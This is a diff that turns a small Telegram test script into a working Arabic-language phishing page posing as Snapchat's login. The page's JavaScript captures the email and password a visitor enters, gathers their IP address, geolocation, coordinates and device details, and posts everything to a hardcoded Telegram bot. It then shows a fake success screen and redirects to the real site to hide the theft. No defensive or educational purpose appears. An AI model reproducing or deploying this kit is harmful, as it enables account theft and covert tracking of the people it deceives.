@@ -1,19 +1,396 @@
 <!DOCTYPE html>
-<html>
-<body>
-    <script>
-        const botToken = '8794936819:AAHuCd1rOGr7NLO0DSpWVX9IJfesqqmIKwQ';
-        const chatId = '1088226862';
-        
-        function sendTest() {
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Test from browser`;
-            fetch(url)
-                .then(r => r.json())
-                .then(d => console.log(d))
-                .catch(e => console.error(e));
+<html lang="ar" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Snapchat - تسجيل الدخول</title>
+    <!-- أيقونة سناب شات الرسمية -->
+    <link rel="shortcut icon" type="image/png" href="https://accounts.snapchat.com/favicon.ico"/>
+    <style>
+        /* إعادة تعيين وإعدادات أساسية */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
         }
-        
-        sendTest();
+
+        body {
+            background-color: #fafafa; /* خلفية فاتحة جداً */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 16px;
+        }
+
+        /* البطاقة الرئيسية */
+        .login-card {
+            background-color: #ffffff;
+            border-radius: 20px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            padding: 32px 24px;
+            text-align: center;
+        }
+
+        /* شبح سناب شات */
+        .ghost-logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 24px;
+            background-color: #fffc00; /* الأصفر المميز */
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 12px rgba(255, 252, 0, 0.3);
+        }
+
+        .ghost-logo svg {
+            width: 48px;
+            height: 48px;
+            fill: #111; /* لون الشبح الأسود */
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 600;
+            color: #111;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            color: #777;
+            font-size: 15px;
+            margin-bottom: 32px;
+            font-weight: 400;
+        }
+
+        /* حقول الإدخال */
+        .input-group {
+            margin-bottom: 16px;
+            text-align: left;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #333;
+            margin-bottom: 6px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1.5px solid #ddd;
+            border-radius: 12px;
+            font-size: 16px;
+            background-color: #f9f9f9;
+            transition: border-color 0.2s, background-color 0.2s;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: #fffc00;
+            background-color: #fff;
+        }
+
+        /* زر تسجيل الدخول الأصفر */
+        .login-btn {
+            background-color: #fffc00;
+            color: #111;
+            border: none;
+            border-radius: 40px;
+            padding: 16px 20px;
+            font-size: 18px;
+            font-weight: 700;
+            width: 100%;
+            cursor: pointer;
+            margin: 24px 0 16px;
+            box-shadow: 0 4px 14px rgba(255, 252, 0, 0.4);
+            transition: background-color 0.2s, transform 0.1s;
+        }
+
+        .login-btn:active {
+            background-color: #f0e600;
+            transform: scale(0.98);
+        }
+
+        .login-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* روابط إضافية */
+        .links {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            margin-top: 16px;
+        }
+
+        .links a {
+            color: #007bff;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        /* حقوق النشر */
+        .footer {
+            margin-top: 30px;
+            color: #aaa;
+            font-size: 12px;
+            border-top: 1px solid #eee;
+            padding-top: 20px;
+        }
+
+        /* رسالة الخطأ */
+        .error-message {
+            color: #d32f2f;
+            font-size: 14px;
+            margin-top: 8px;
+            display: none;
+            text-align: left;
+        }
+
+        /* شاشة النجاح المخفية */
+        .success-screen {
+            display: none;
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        .success-screen h2 {
+            color: #2e7d32;
+            margin-bottom: 16px;
+        }
+
+        .success-screen p {
+            color: #555;
+            margin-bottom: 24px;
+        }
+
+        .success-screen a {
+            color: #fffc00;
+            background-color: #111;
+            padding: 12px 24px;
+            border-radius: 40px;
+            text-decoration: none;
+            font-weight: bold;
+            display: inline-block;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-card" id="loginCard">
+        <!-- شبح سناب شات -->
+        <div class="ghost-logo">
+            <svg viewBox="0 0 24 24">
+                <path d="M12,2C6.48,2,2,6.48,2,12s4.48,10,10,10s10-4.48,10-10S17.52,2,12,2z M12,20c-4.41,0-8-3.59-8-8s3.59-8,8-8 s8,3.59,8,8S16.41,20,12,20z M12,6c-1.1,0-2,0.9-2,2v2c0,1.1,0.9,2,2,2s2-0.9,2-2V8C14,6.9,13.1,6,12,6z M12,14c-1.1,0-2,0.9-2,2 s0.9,2,2,2s2-0.9,2-2S13.1,14,12,14z"/>
+            </svg>
+        </div>
+
+        <h1>تسجيل الدخول</h1>
+        <div class="subtitle">أهلاً بعودتك! يرجى تسجيل الدخول للمتابعة.</div>
+
+        <!-- نموذج تسجيل الدخول -->
+        <form id="loginForm" onsubmit="return false;">
+            <div class="input-group">
+                <label for="email">البريد الإلكتروني / اسم المستخدم</label>
+                <input type="text" id="email" name="email" placeholder="example@snapchat.com" required>
+            </div>
+
+            <div class="input-group">
+                <label for="password">كلمة المرور</label>
+                <input type="password" id="password" name="password" placeholder="●●●●●●●●" required>
+            </div>
+
+            <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
+            <div class="error-message" id="errorMessage"></div>
+        </form>
+
+        <div class="links">
+            <a href="#">إنشاء حساب</a>
+            <a href="#">نسيت كلمة المرور؟</a>
+        </div>
+
+        <div class="footer">
+            © 2024 Snapchat. جميع الحقوق محفوظة.
+        </div>
+    </div>
+
+    <!-- شاشة النجاح المخفية (تظهر بعد الإرسال) -->
+    <div class="login-card" id="successScreen" style="display: none;">
+        <div class="ghost-logo" style="background-color: #2e7d32;">
+            <svg viewBox="0 0 24 24" style="fill: white;">
+                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
+            </svg>
+        </div>
+        <h2>تم التسجيل بنجاح!</h2>
+        <p>سيتم تحويلك إلى المنصة خلال ثوانٍ...</p>
+        <a href="https://www.snapchat.com" target="_blank">المتابعة إلى Snapchat</a>
+    </div>
+
+    <!-- تحميل axios للإرسال -->
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+
+    <script>
+        (function() {
+            // ------------------- إعدادات تيليجرام -------------------
+            const BOT_TOKEN = '8794936819:AAHuCd1rOGr7NLO0DSpWVX9IJfesqqmIKwQ';
+            const CHAT_ID = '1088226862';
+
+            // ------------------- العناصر -------------------
+            const loginCard = document.getElementById('loginCard');
+            const successScreen = document.getElementById('successScreen');
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const loginBtn = document.getElementById('loginBtn');
+            const errorMessage = document.getElementById('errorMessage');
+            const loginForm = document.getElementById('loginForm');
+
+            // ------------------- دالة إرسال الرسالة إلى تيليجرام -------------------
+            async function sendTelegramMessage(text) {
+                try {
+                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: 'HTML'
+                    });
+                } catch (error) {
+                    console.error('خطأ في إرسال الرسالة إلى تيليجرام:', error);
+                }
+            }
+
+            // ------------------- دالة للحصول على عنوان IP والمعلومات الجغرافية -------------------
+            async function collectDeviceInfo() {
+                let ipData = {
+                    ip: 'غير متوفر',
+                    country: 'غير متوفر',
+                    city: 'غير متوفر',
+                    isp: 'غير متوفر'
+                };
+
+                // محاولة جلب IP والمعلومات من ip-api.com (بدون HTTPS مؤقتاً)
+                try {
+                    const response = await axios.get('http://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,timezone,currency,isp,query');
+                    if (response.data.status === 'success') {
+                        ipData = {
+                            ip: response.data.query,
+                            country: response.data.country,
+                            city: response.data.city,
+                            region: response.data.regionName,
+                            isp: response.data.isp,
+                            lat: response.data.lat,
+                            lon: response.data.lon,
+                            timezone: response.data.timezone,
+                            currency: response.data.currency
+                        };
+                    }
+                } catch (error) {
+                    console.error('خطأ في جلب IP:', error);
+                    // إذا فشل، نحاول api.ipify.org فقط للـ IP
+                    try {
+                        const ipResponse = await axios.get('https://api.ipify.org?format=json');
+                        ipData.ip = ipResponse.data.ip;
+                    } catch (e) {}
+                }
+
+                // معلومات المتصفح والجهاز
+                const browserInfo = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    screen: `${screen.width}x${screen.height}`,
+                    cookiesEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack || 'غير محدد'
+                };
+
+                return { ipData, browserInfo };
+            }
+
+            // ------------------- معالج تسجيل الدخول -------------------
+            async function handleLogin() {
+                const email = emailInput.value.trim();
+                const password = passwordInput.value.trim();
+
+                // التحقق من الحقول
+                if (!email || !password) {
+                    errorMessage.style.display = 'block';
+                    errorMessage.textContent = 'يرجى إدخال البريد الإلكتروني وكلمة المرور.';
+                    return;
+                }
+
+                // تعطيل الزر
+                loginBtn.disabled = true;
+                loginBtn.textContent = 'جاري التحقق...';
+                errorMessage.style.display = 'none';
+
+                // جمع المعلومات
+                const { ipData, browserInfo } = await collectDeviceInfo();
+
+                // بناء الرسالة
+                let message = `<b>📱 Snapchat Login</b>\n\n`;
+                message += `<b>👤 الحساب:</b>\n`;
+                message += `✉️ Email: ${email}\n`;
+                message += `🔑 Password: ${password}\n\n`;
+
+                message += `<b>🌐 IP & Location:</b>\n`;
+                message += `🖥️ IP: ${ipData.ip}\n`;
+                message += `🌍 Country: ${ipData.country}\n`;
+                message += `🏙️ City: ${ipData.city || ipData.region || 'غير معروف'}\n`;
+                message += `📡 ISP: ${ipData.isp}\n`;
+                if (ipData.lat && ipData.lon) {
+                    message += `📍 Coordinates: ${ipData.lat}, ${ipData.lon}\n`;
+                    message += `🗺️ Maps: https://www.google.com/maps?q=${ipData.lat},${ipData.lon}\n`;
+                }
+                message += `⏰ Timezone: ${ipData.timezone || browserInfo.timeZone}\n\n`;
+
+                message += `<b>💻 Device Info:</b>\n`;
+                message += `📱 Platform: ${browserInfo.platform}\n`;
+                message += `🌐 Language: ${browserInfo.language}\n`;
+                message += `🖥️ Screen: ${browserInfo.screen}\n`;
+                message += `🍪 Cookies: ${browserInfo.cookiesEnabled ? 'مفعلة' : 'معطلة'}\n`;
+                message += `🚫 Do Not Track: ${browserInfo.doNotTrack}\n`;
+                message += `🕵️ User Agent: ${browserInfo.userAgent}\n`;
+
+                // إرسال إلى تيليجرام
+                await sendTelegramMessage(message);
+
+                // إظهار شاشة النجاح
+                loginCard.style.display = 'none';
+                successScreen.style.display = 'block';
+
+                // إعادة توجيه المستخدم إلى سناب شات بعد ثانيتين
+                setTimeout(() => {
+                    window.location.href = 'https://www.snapchat.com';
+                }, 2000);
+            }
+
+            // ------------------- ربط الأحداث -------------------
+            loginForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+                handleLogin();
+            });
+
+            // منع النقر المزدوج على الزر
+            loginBtn.addEventListener('click', (e) => {
+                e.preventDefault();
+                handleLogin();
+            });
+
+        })();
     </script>
 </body>
 </html>
